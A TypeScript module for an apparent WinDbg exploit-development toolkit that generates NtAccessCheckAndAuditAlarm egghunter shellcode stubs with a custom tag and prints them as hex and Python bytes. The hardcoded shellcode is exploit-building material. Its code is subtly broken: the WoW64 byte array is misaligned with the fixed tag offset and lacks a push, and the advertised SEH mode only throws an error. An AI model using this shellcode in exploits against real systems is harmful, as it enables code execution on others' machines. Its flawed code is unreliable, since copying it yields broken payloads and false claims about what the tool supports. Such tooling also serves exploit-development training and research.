import { Command, CommandResult } from "../core/registry";
import * as out from "../core/output";

type EggOptions = {
  tag: string;
  mode: "ntaccess" | "seh";
  wow64: boolean;
};

const EGGHUNTERS: Record<string, number[]> = {
  ntaccess_x86: [0x66, 0x81, 0xca, 0xff, 0x0f, 0x42, 0x52, 0x6a, 0x02, 0x58, 0xcd, 0x2e, 0x3c, 0x05, 0x5a, 0x74, 0xef, 0xb8, 0x57, 0x30, 0x30, 0x54, 0x8b, 0xfa, 0xaf, 0x75, 0xea, 0xaf, 0x75, 0xe7, 0xff, 0xe7],
  ntaccess_wow64: [0x66, 0x81, 0xca, 0xff, 0x0f, 0x41, 0x6a, 0x02, 0x58, 0xcd, 0x2e, 0x3c, 0x05, 0x5a, 0x74, 0xef, 0xb8, 0x57, 0x30, 0x30, 0x54, 0x8b, 0xfa, 0xaf, 0x75, 0xea, 0xaf, 0x75, 0xe7, 0xff, 0xe7],
};

function bytesToHex(bytes: number[]): string {
  return bytes.map((value) => value.toString(16).toUpperCase().padStart(2, "0")).join("");
}

function bytesToPython(bytes: number[]): string {
  return `b"${bytes.map((value) => `\\x${value.toString(16).padStart(2, "0")}`).join("")}"`;
}

function build(options: EggOptions): number[] {
  if (options.mode === "seh") {
    throw new Error(
      'The SEH egghunter mode is not implemented. Use mode: "ntaccess" instead, which probes memory via the NtAccessCheckAndAuditAlarm syscall (INT 0x2E).',
    );
  }
  const key = `${options.mode}_${options.wow64 ? "wow64" : "x86"}`;
  const bytes = EGGHUNTERS[key];
  if (!bytes) {
    throw new Error(`Unsupported egghunter mode: ${key}`);
  }

  const hunter = [...bytes];
  const tagBytes = options.tag.padEnd(4, "X").slice(0, 4).split("").map((char) => char.charCodeAt(0));
  hunter.splice(18, 4, ...tagBytes);
  return hunter;
}

export function createEgghunterCommand(): Command {
  return {
    name: "egghunter",
    description: "Generate NtAccess/SEH egghunter stubs.",
    usage: "dx @$osed.egghunter({ tag: 'W00T', mode: 'ntaccess', wow64: false })",
    examples: [
      "dx @$osed.egghunter({ tag: 'W00T', mode: 'ntaccess', wow64: false })",
      "dx @$osed.egghunter({ tag: 'B33F', mode: 'seh', wow64: true })",
    ],
    schema: {
      tag: { type: "string", default: "W00T" },
      mode: { type: "string", enum: ["ntaccess", "seh"], default: "ntaccess" },
      wow64: { type: "boolean", default: false },
    },
    execute(options: Record<string, unknown>): CommandResult {
      const hunter = build(options as EggOptions);

      out.section("Egghunter");
      out.info(`Tag: ${options.tag as string}`);
      out.info(`Mode: ${options.mode as string}`);
      out.info(`WoW64: ${options.wow64 ? "yes" : "no"}`);
      out.info(`Size: ${hunter.length} bytes`);
      out.print(bytesToHex(hunter));
      out.print(bytesToPython(hunter));
      out.whyItMatters("Egghunters shrink staged exploits and locate payloads in constrained buffers.");

      return {
        command: "egghunter",
        args: options,
        success: true,
        findings: [{ bytes: hunter, size: hunter.length }],
        warnings: [],
        errors: [],
      };
    },
  };
}
